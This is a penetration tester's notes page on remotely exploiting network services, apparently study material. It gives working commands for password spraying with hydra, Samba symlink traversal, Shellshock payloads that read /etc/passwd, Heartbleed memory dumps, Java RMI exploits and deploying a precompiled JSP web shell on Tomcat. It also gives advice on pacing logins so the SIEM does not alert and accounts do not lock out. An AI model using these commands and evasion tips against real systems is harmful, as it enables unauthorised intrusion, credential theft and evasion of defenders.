> Exploit the target from a remote attacker via its provided services.

## Password spray attack

> An attempt to guess a password without triggering a lockout of an account.
> The idea behind it: Taking a default password of the company and shoot it against all known accounts (so none gets locked out and maybe there is one or more successfull logins)
> Password:Account --> 1:N

Prerequisites:
- enumerated and valid user accounts
	- enumeration should be done beforehand
	- it may help to get the naming convention of the company: `john.doe` or `johndoe` or `jdoe` to be able to validate even more existing useraccounts

### Enumeration of Usernames

> Verify usernames exists -> requires list of possible usernames and possibly the knowledge of the naming convention

- [source_for_wordlist](https://github.com/insidetrust/statistically-likely-usernames)

Verification should happen via exposed interfaces of services.

#### SMTP / Samba

```bash
cat /usr/share/metasploit-framework/data/wordlists/unix_users.txt  # userlist
```

For the Services check:
- [[Linux Exploitation/Information Gathering#1. Enumeration of E-Mail users]] 
- [[Linux Exploitation/Information Gathering#3. Enumeration of username]]

### Common Passwords

> The usage of possible patterns of common passwords (careful for context!)
> Given the *year* or *companyname* we can assume some commonly used passwords for our attack

Candidates
- Password01, Password02
- Summer2018, Fall2018 `Season{Year}`
- FooCorp01, FooCorp02

**IMPORTANT** *IF* password complexity policy is enforced, minor changes in the password suffice to please the policy (change Season/Month of the password)

### Summary & Attack

1. Create possible list of users: statistically list for usernames, or possible names from other sources of the company website
2. Confirm valid users through `smtp`, `nfs` or other means
3. Create the userlist and *max* 1-2 password candidates
4. Identify services that we can check the username:password combination against

```bash
hydra -L ./users.txt -P ./pwlist.txt 10.10.10.20 smb # login attempts against smb service

# after found password, try login against multiple servers
hydra -l mike -p Passw0rd01 -M ssh_server_list.txt ssh
```

Other services with metasploit module to exploit:
- smb: `smb_login`
- owa: `owa_login`

**CAUTION:** Avoid empty password login attempts (may be done per default by the used tools), also only a maxium of 2 passwords or the SIEM will alert. If using more passwords: wait 30-45+ minutes before attempting again to avoid detection and lockout of accounts.

## Service Exploitation

> Specific exploits for different Services

### Samba

#### 1. Check Version

For the enumeration check [[Linux Exploitation/Information Gathering#Samba]]

#### 2. Search for vulnerabilities

```bash
searchsploit samba <version>  # 3.0.20

msf> search type:exploit samba
```

-> Take your pick for the exploit, you may also check the configuration of samba (needs local system access) or the permissions of the shares in order to determine a possible exploitation.

#### Samba Symlink Directory Traversal

> In short set a symlink to `/` (root) on a share where you have `r/w` permissions. Requires the `widelinks` option in the config set to `yes` - can only be verified if the exploit works

```bash
msf> use auxiliary/admin/smb/samba_symlink_traversal # fire 

# connect to created symlink and browse root
smbclient \\\\<targetIP>\\tmp -N
```

### Shellshock (may be behind any other service)

> has been in the wild and exploited via custom `User-Agent` payload, that was processed on the remote server...

#### 1. Check for cgi files or other pages that might use the shell in the background on the server

```bash
# check for cgi files on the target
gobuster dir -u http://<targetIP>/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x cgi
```

If applications are unraveled, check them individually.

#### 2. Identify a vulnerability

```bash
# with nmap
nmap --script http-shellshock --script-args uri=/cgi-bin/tools.cgi <targetIP> -p 80

# or curl (taken from hacktricks)
curl -H 'User-Agent: () { :; }; /bin/bash -c "sleep 5"' http://<targetIP>/cgi-bin/<application>.cgi
```

#### 3. Exploit

```bash
# using metasploit
msf> use exploit/multi/http/apache_mod_cgi_bash_env_exec

# or manually
wget -U "()) { foo;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://<targetIP>/cgi-bin/tools.cgi && cat login.cgi
```

### Heartbleed (SSL)

#### 1. Check if system is vulnerable

```bash
nmap --script ssl-heartbleed <targetIP>
```

#### 2. Dump encrypted memory contents

```bash
msf> use auxiliary/scanner/ssl/openssl_heartbleed
msf> show actions # change to dump or whatever you like
# Check loot folder after it's done
```

-> If nothing useful is leaked, try again as the adjacent memory may contain different content at different times.

### Java RMI Registry

#### 1. Check if the system has the Java RMI Registry running

```bash
nmap -sT <targetIP> -p 1099 -sV # 1099 being the typical port for Java RMI Registry
msf> use auxiliary/scanner/misc/java_rmi_server
```

Default port may be filtered/blocked - if `rpcbind` is used an alternative port may be listed there.

#### 2. Exploit the vuln 

```bash
msf> use exploit/multi/misc/java_rmi_server
msf> set ssl=true # requires SSL cert, may avoid detection
```

### Java deserialization

- [source](https://zonksec.com/blog/hands-on-with-weblogic-serialization-vulnerability/)

### Exploiting Tomcat

Check default credentials for "Tomcat Manager" admin interface reached through a link on port `8180' (tcp) 

```bash
msf> use auxiliary/scanner/http/tomcat_mgr_login
msf> show options
```

-> If access is granted, we can upload our own java apps and also a shell

```bash
ls /usr/share/laudanum/jsp # check cmd.war -> precompiled shell
# deploy on the server
```

If successfully deployed browser and use the shell `http://<targetIP>:8180/cmd/cmd.jsp` (check the path when deploying the app).